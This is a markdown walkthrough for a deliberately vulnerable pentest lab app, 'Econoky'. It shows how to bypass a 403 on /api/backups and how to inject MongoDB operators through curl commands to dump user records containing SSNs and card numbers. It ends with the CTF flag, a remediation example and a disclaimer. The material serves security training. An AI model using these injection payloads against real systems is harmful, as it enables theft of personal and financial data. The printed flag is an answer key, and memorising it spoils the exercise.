# NoSQL Injection Exploitation Guide

## üìã Overview

This guide documents the NoSQL Injection vulnerability present in the `/api/backups` endpoint of the Econoky application. This is an **educational resource** for penetration testing and security training purposes.

## üéØ Vulnerability Description

The `/api/backups` endpoint is vulnerable to NoSQL Injection attacks because:

1. **Query parameters are parsed as JSON** when they contain special characters (`{`, `$`)
2. **POST body is accepted directly** without any sanitization
3. **MongoDB operators pass through** directly to database queries
4. **No input validation** is performed on user-supplied data

### Affected Endpoint

- **URL**: `/api/backups/[anything]` (requires path traversal to bypass 403)
- **Methods**: GET, POST
- **Database**: MongoDB collection `users_backup`

## üîì Prerequisites: Bypassing 403 Restriction

Before exploiting NoSQL injection, you must bypass the 403 restriction on `/api/backups`:

```bash
# The exact path is blocked
curl http://localhost:3000/api/backups
# Returns: 403 Forbidden

# Bypass using trailing slash or subpath
curl http://localhost:3000/api/backups/
curl http://localhost:3000/api/backups/data
curl http://localhost:3000/api/backups/.
```

## üíâ Exploitation Techniques

### Method 1: GET Request with Query Parameters

#### Default Query (Basic Users Only)
```bash
curl "http://localhost:3000/api/backups/data"
```
Returns only `userType: "basic"` and `accountStatus: "active"` users (default filters).

#### Bypass with $ne Operator - See All Users
```bash
# URL encoded: {"$ne": null} becomes %7B%22%24ne%22%3A%20null%7D
curl "http://localhost:3000/api/backups/data?userType=%7B%22%24ne%22%3A%20null%7D"
```
This returns **all users** regardless of userType, including admin and premium users with sensitive data.

#### Target Admin Users Specifically
```bash
curl "http://localhost:3000/api/backups/data?userType=admin"
```
Returns only admin users with full sensitive data including the FLAG.

#### Target Premium Users
```bash
curl "http://localhost:3000/api/backups/data?userType=premium"
```
Returns premium users with credit card information.

#### Bypass Both Filters
```bash
curl "http://localhost:3000/api/backups/data?userType=%7B%22%24ne%22%3A%20null%7D&status=%7B%22%24ne%22%3A%20null%7D"
```
Returns all users regardless of userType AND accountStatus.

### Method 2: POST Request with JSON Body

POST requests are even easier to exploit as JSON is natively accepted:

#### Get All Users (Bypass All Filters)
```bash
curl -X POST "http://localhost:3000/api/backups/data" \
  -H "Content-Type: application/json" \
  -d '{"userType": {"$ne": null}, "accountStatus": {"$ne": null}}'
```

#### Target Admin Users
```bash
curl -X POST "http://localhost:3000/api/backups/data" \
  -H "Content-Type: application/json" \
  -d '{"userType": "admin"}'
```

#### Search by Email with Regex
```bash
curl -X POST "http://localhost:3000/api/backups/data" \
  -H "Content-Type: application/json" \
  -d '{"email": {"$regex": "admin"}}'
```

#### Find Users with Flag Field
```bash
curl -X POST "http://localhost:3000/api/backups/data" \
  -H "Content-Type: application/json" \
  -d '{"flag": {"$exists": true}}'
```

## üîß Useful MongoDB Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `$ne` | Not equal | `{"userType": {"$ne": "basic"}}` |
| `$gt` | Greater than | `{"salary": {"$gt": 100000}}` |
| `$gte` | Greater than or equal | `{"creditLimit": {"$gte": 25000}}` |
| `$lt` | Less than | `{"salary": {"$lt": 50000}}` |
| `$in` | In array | `{"userType": {"$in": ["admin", "premium"]}}` |
| `$nin` | Not in array | `{"accountStatus": {"$nin": ["suspended"]}}` |
| `$regex` | Regular expression | `{"email": {"$regex": "admin"}}` |
| `$exists` | Field exists | `{"flag": {"$exists": true}}` |
| `$or` | Logical OR | `{"$or": [{"userType": "admin"}, {"userType": "premium"}]}` |

## üì¶ Sensitive Data Extracted

When successful, you can extract:

| Field | Description |
|-------|-------------|
| `email` | User email addresses |
| `name` | Full names |
| `address` | Physical addresses |
| `creditCard` | Credit card numbers (unmasked for premium/admin) |
| `creditLimit` | Credit card limits |
| `salary` | Admin salary information |
| `ssn` | Social Security Numbers |
| `flag` | CTF flag (admin only) |

## üèÅ Capture The Flag

The flag is stored in the admin user's record:

```
ECONOKY{n0sql_1nj3ct10n_pwn3d_th3_b4ckup}
```

### Steps to Capture the Flag:

1. **Bypass 403**: Access `/api/backups/data` instead of `/api/backups`
2. **Inject NoSQL operator**: Use `userType={"$ne": null}` or target admin directly
3. **Extract flag**: Find the `flag` field in the admin user's response

### Quick One-Liner:
```bash
curl -s "http://localhost:3000/api/backups/data?userType=admin" | grep -o 'ECONOKY{[^}]*}'
```

## üõ°Ô∏è Remediation (For Learning)

To fix this vulnerability:

1. **Never trust user input** - Always validate and sanitize
2. **Use parameterized queries** - Don't build queries from raw strings
3. **Whitelist allowed values** - Only accept known-good values
4. **Validate data types** - Ensure parameters are strings, not objects
5. **Use schema validation** - Enforce types at the database level

### Example Fix:
```typescript
// VULNERABLE:
const userType = parseJSON(req.query.userType);
query.userType = userType; // Allows {"$ne": null}

// FIXED:
const allowedTypes = ['basic', 'premium', 'admin'];
const userType = String(req.query.userType);
if (!allowedTypes.includes(userType)) {
  return res.status(400).json({ error: 'Invalid userType' });
}
query.userType = userType; // Only string values allowed
```

## ‚ö†Ô∏è Disclaimer

This vulnerability is **intentionally implemented** for educational purposes in a controlled pentesting lab environment. **DO NOT** use these techniques against systems without explicit authorization. Unauthorized access to computer systems is illegal.

---

**Happy Hacking! üéØ**
